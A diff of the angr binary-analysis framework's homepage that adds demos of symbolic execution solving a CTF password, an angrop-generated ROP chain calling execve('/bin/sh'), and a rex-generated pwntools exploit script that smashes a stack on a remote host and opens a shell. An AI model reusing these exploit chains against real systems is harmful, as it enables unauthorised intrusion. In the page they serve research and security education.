@@ -30,10 +30,19 @@
 
 
     <h2>What is angr?</h2>
-    <p>angr is a python framework for <abbr title="Binary analysis is the art of understanding the behavior of compiled programs without source code">analyzing binaries</abbr>. It focuses on both static and dynamic symbolic ("concolic") analysis, making it applicable to a variety of tasks.</p>
-    <p>As an introduction to angr's capabilities, here is a brief code example that analyzes a fake backdoored firmware image to perform control-flow analysis and find the backdoor via symbolic execution:</p>
+    <p>angr is a python framework for <abbr title="Binary analysis is the art of understanding the behavior of compiled programs without source code">analyzing binaries</abbr>. It combines both static and dynamic symbolic ("concolic") analysis, making it applicable to a variety of tasks.</p>
 
-      <pre>
+    <p>As an introduction to angr's capabilities, here are some of the things that you can do using angr and the tools built with it:</p>
+
+    <!-- code from http://dabblet.com/gist/3157489 -->
+    <ul>
+      <li>
+      Recover the control-flow graph (CFG) of a binary.
+      <span>
+        <input type="checkbox" id="cfg-example" class="expand-check">
+        <label for="cfg-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+          <pre>
 <span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import angr</span>
 <span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">proj = angr.Project('<a href="https://github.com/angr/angr-doc/tree/master/examples/fauxware">./fauxware</a>')</span>
 <span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">cfg = proj.analyses.CFG()</span>
@@ -55,10 +64,131 @@
  4196125L: &lt;Function main (0x40071d)&gt;,
  4196320L: &lt;Function __libc_csu_init (0x4007e0)&gt;,
  4196480L: &lt;Function __do_global_ctors_aux (0x400880)&gt;}</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">pg = proj.factory.path_group().explore(find=0x4006ed)</span>
-<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">pg.found[0].state.posix.dumps(0)</span>
-<span class="pyoutput">'\x00\x00\x00\x00\x00\x00\x00\x00\x00<strong>SOSNEAKY</strong>\x00'</span>
 </pre>
+        </div>
+      </span>
+      <li>
+      Use symbolic execution to figure out inputs to trigger specific functionality.
+      <span>
+        <input type="checkbox" id="symexec-example" class="expand-check">
+        <label for="symexec-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+          <pre>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import os</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import angr</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">project = angr.Project("defcamp_quals_2015_r100", auto_load_libs=False)</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">path_group = project.factory.path_group()</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">path_group.explore(find=lambda path: 'Nice!' in path.state.posix.dumps(1))</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">print path_group.found[0].state.posix.dumps(0)</span>
+<span class="pyoutput">Code_Talkers</span>
+
+<span class="pyprompt">#</span> <span class="pyinput">./defcamp_quals_2015_r100</span>
+Enter the password: <span class="pyinput">Code_Talkers</span>
+Nice!
+</pre>
+        </div>
+      </span>
+      <li>
+      Automatically build ROP chains using <a href="http://github.com/salls/angrop">angrop</a>, an advanced chain builder created using angr.
+      <span>
+        <input type="checkbox" id="rop-example" class="expand-check">
+        <label for="rop-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+          <pre>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import angr</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import angrop</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">project = angr.Project("/bin/bash", auto_load_libs=False)</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">rop = project.analyses.ROP()</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">rop.find_gadgets()</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">rop.execve("/bin/sh").print_payload_code()</span>
+<span class="pyoutput">chain = ""
+chain += p64(0x4929bc)  # pop rax; ret 
+chain += p64(0x702fb8)
+chain += p64(0x420b5c)  # pop rsi; ret 
+chain += p64(0x68732f6e69622f)
+chain += p64(0x4a382a)  # mov qword ptr [rax + 8], rsi; xor eax, eax; ret 
+chain += p64(0x4929bc)  # pop rax; ret 
+chain += p64(0x3b)
+chain += p64(0x41e844)  # pop rdi; ret 
+chain += p64(0x702fc0)
+chain += p64(0x4ed076)  # pop rdx; ret 
+chain += p64(0x0)
+chain += p64(0x420b5c)  # pop rsi; ret 
+chain += p64(0x0)
+chain += p64(0x401b94)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(0x0)
+</span>
+</pre>
+        </div>
+      </span>
+      <li>
+      Automatically harden binaries using <a href="http://github.com/shellphish/patcherex">patcherex</a>, a binary patching and reassembly technique that uses angr to insert arbitrary code into arbitrary locations in DECREE and Linux binaries.
+      <span>
+        <input type="checkbox" id="patcherex-example" class="expand-check">
+        <label for="patcherex-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+          <pre>
+<span class="pyprompt">#</span> <span class="pyinput">patcherex/patch_master.py single test_binaries/CADET_00003 stackretencryption CADET_00003_stackretencryption</span>
+</pre>
+        </div>
+      </span>
+      <li>
+      Automatically generate exploits (for DECREE and simple Linux binaries) using <a href="http://github.com/shellphish/rex">rex</a>.
+      <span>
+        <input type="checkbox" id="rex-example" class="expand-check">
+        <label for="rex-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+          <pre>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">import rex</span>
+<span class="pyprompt">&gt;&gt;&gt;</span> <span class="pyinput">rex.Crash("vuln_stacksmash", "A"*227).exploit().arsenal["rop_to_system"].script("x.py")</span>
+
+<span class="pyprompt">#</span> <span class="pyinput">cat x.py</span>
+<span class="pyoutput">import sys
+import time
+from pwn import *
+
+if len(sys.argv) < 3:
+    print "%s: <host> <port>" % sys.argv[0]
+    sys.exit(1)
+
+r = remote(sys.argv[1], int(sys.argv[2]))
+r.send('\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xde\x82\x04\x08\x10\x83\x04\x08\xf2\x82\x04\x08\x00\x00\x00\x00\x1f\xa0\x04\x08\x08\x00\x00\x00\xde\x82\x04\x08 \x83\x04\x08\xf5\x82\x04\x08\x1f\xa0\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+time.sleep(.1)
+r.send('/bin/sh\x00')
+r.interactive()
+</pre>
+        </div>
+      </span>
+      <li>
+      Use <a href="https://github.com/angr/angr-management">angr-management</a>, a (very alpha state!) GUI for angr, to analyze binaries!
+      <span>
+        <input type="checkbox" id="am-example" class="expand-check">
+        <label for="am-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+          <pre>
+<span class="pyprompt">#</span> <span class="pyinput">angr-management/run-docker.sh</span>
+</pre>
+        </div>
+      </span>
+      <li>
+      Achieve cyber-autonomy in the comfort of your own home, using <a href="http://shellphish.net/cgc/#tools">Mechanical Phish</a>, the third-place winner of the DARPA Cyber Grand Challenge.
+    </ul>
+
+		<p>angr itself is made up of several subprojects, all of which can be used separately in other projects:
+    <ul>
+      <li>an executable and library loader, <a href="https://github.com/angr/cle">CLE</a></li>
+      <li>a library describing various architectures, <a href="https://github.com/angr/archinfo">archinfo</a></li>
+      <li>a Python wrapper around the binary code lifter VEX, <a href="https://github.com/angr/pyvex">PyVEX</a></li>
+	  	<li>a code simulation engine, <a href="https://github.com/angr/simuvex">SimuVEX</a></li>
+	  	<li>a data backend to abstract away differences between static and symbolic domains, <a href="https://github.com/angr/claripy">Claripy</a></li>
+	  	<li>the full-program analysis suite itself, <a href="https://github.com/angr/angr">angr</a></li>
+    </ul>
 
     <h2>How do I learn?</h2>
     <p>There are a few resources you can use to help you get up to speed!</p>
@@ -83,19 +213,7 @@
     <p>In all this, please keep in mind that angr is a large project being frantically worked on by a very small group of overworked students. It's open source, with a typical open source support model (i.e., pray for the best).</p>
     <p>For an idea of <i>what</i> to help with, check <a href="https://docs.angr.io/HELPWANTED.html">this</a> out.
 
-    <h2>What's angr made of?</h2>
-	<p>angr is made up of several subprojects, all of which are <a href="https://github.com/angr">open-source!</a></p>
-    <ul>
-      <li>an executable and library loader, <a href="https://github.com/angr/cle">CLE</a></li>
-      <li>a library describing various architectures, <a href="https://github.com/angr/archinfo">archinfo</a></li>
-      <li>a Python wrapper around the binary code lifter VEX, <a href="https://github.com/angr/pyvex">PyVEX</a></li>
-	  <li>a VEX simulation engine, <a href="https://github.com/angr/simuvex">SimuVEX</a></li>
-	  <li>a data backend to abstract away differences between static and symbolic domains, <a href="https://github.com/angr/claripy">Claripy</a></li>
-	  <li>the full-program analysis suite itself, <a href="https://github.com/angr/angr">angr</a></li>
-	  <li>a GUI for some features of angr, <a href="https://github.com/angr/angr-management">angr-management</a></li>
-    </ul>
-
-    <h2>How has it been used?</h2>
+    <h2>Can angr be used for science?</h2>
 
     <p>We have used angr heavily in our academic research! If you have used angr or its sub-components in your research, please cite at least the following paper describing it:</p>
 
@@ -112,13 +230,44 @@
     <div>
       <input type="checkbox" id="showhide" class="expand-check">
       <label for="showhide">
-        <div class="show-more">Show more papers</div>
-        <div class="show-less">Show fewer papers</div>
+        <div class="show-more">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show more papers</div>
+        <div class="show-less">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show fewer papers</div>
       </label>
       <div class="expandable">
-        <p>Additionally, the angr authors have used angr in the following publications:</p>
+        <p>Additionally, the angr authors and their collaborators have used angr in the following publications:</p>
 
 <pre>
+@inproceedings{bao2017your,
+  title={{Your Exploit is Mine: Automatic Shellcode Transplant for Remote Exploits}},
+  author={Bao, Tiffany and Wang, Ruoyu and Shoshitaishvili, Yan and Brumley, David},
+  booktitle={Proceedings of the 2017 Network and Distributed System Security Symposium},
+  year={2017}
+}
+
+@inproceedings{machiry2017boomerang,
+  title={{BOOMERANG: Exploiting the Semantic Gap in Trusted Execution Environments}},
+  author={Machiry, Aravind and Gustafson, Eric and Spensky, Chad and Salls, Christopher
+          and Stephens, Nick and Wang, Ruoyu and Bianchi, Antonio and Choe, Yung Ryn and
+          Kruegel, Christopher and Vigna, Giovanni},
+  booktitle={Proceedings of the 2017 Network and Distributed System Security Symposium},
+  year={2017}
+}
+
+@inproceedings{wang2017ramblr,
+  title={{Ramblr: Making Reassembly Great Again}},
+  author={Wang, Ruoyu and Shoshitaishvili, Yan and Bianchi, Antonio and Aravind, Machiry
+          and Grosen, John and Grosen, Paul and Kruegel, Christopher and Vigna, Giovanni},
+  booktitle={Proceedings of the 2017 Network and Distributed System Security Symposium},
+  year={2017}
+}
+
+@misc{shellphish-phrack,
+  title={Cyber Grand Shellphish},
+  author={Shellphish},
+  note={\url{http://phrack.org/papers/cyber_grand_shellphish.html}},
+  year={2017},
+}
+
 @inproceedings{stephens2016driller,
   title={{Driller: Augmenting Fuzzing Through Selective Symbolic Execution}},
   author={Stephens, Nick and Grosen, John and Salls, Christopher and Dutcher, Andrew and
@@ -171,7 +320,7 @@
     </div>
 
 
-    <p>Non-academically, angr was one of the underpinnings of Shellphish's Cyber Reasoning System for the DARPA Cyber Grand Challenge, enabling them to win third place in the final round (more info <a href="http://shellphish.net/cgc">here</a>)! Shellphish has also used angr in many CTFs.</p>
+    <p>Semi-academically, angr was one of the underpinnings of Shellphish's Cyber Reasoning System for the DARPA Cyber Grand Challenge, enabling them to win third place in the final round (more info <a href="http://shellphish.net/cgc">here</a>)! Shellphish has also used angr in many CTFs.</p>
 
     <h2>Who works on angr?</h2>
     <p>angr is worked on by several researchers in the <a href="http://seclab.cs.ucsb.edu">Computer Security Lab at UC Santa Barbara</a>. Core developers (arbitrarily, 1000+ lines of code!) include:</p>
